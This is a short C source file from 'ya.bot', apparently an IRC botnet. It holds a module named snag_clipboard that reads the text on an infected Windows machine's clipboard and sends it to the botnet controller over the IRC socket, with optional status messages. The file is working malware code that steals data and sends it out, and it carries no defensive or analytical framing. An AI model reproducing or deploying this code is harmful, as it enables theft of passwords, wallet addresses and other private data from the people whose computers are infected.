/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_SNAGCLIPBOARD
void snag_clipboard(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	char *pszBuffer, szText[IRCBUF];
	HANDLE hData;
	int i;
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagclipboardgettingclipboarddata,
					CBLUE, string_replysnag, CEND, string_replydotbot);
		OpenClipboard(NULL);
		hData = GetClipboardData(CF_TEXT);
	if (hData)
	{
			pszBuffer = (char*)GlobalLock(hData);
			strncpy(szText, pszBuffer, sizeof(szText) - 1);
		for (i = 0; i < (int)strlen(szText); i++)
		{
			if (szText[i] == '\r')
					szText[i] = ' ';
			else if (szText[i] == '\n')
					szText[i] = ' ';
		}
		if (!bSilent)
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagclipboarddata,
						CGREEN, string_replysnag, CEND, string_replydotbot,
						CBLUE, CEND, szText);
	}
		GlobalUnlock(hData);
		CloseClipboard();
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagendofsnag,
					CBLUE, string_replysnag, CEND, string_replydotbot);
}
#endif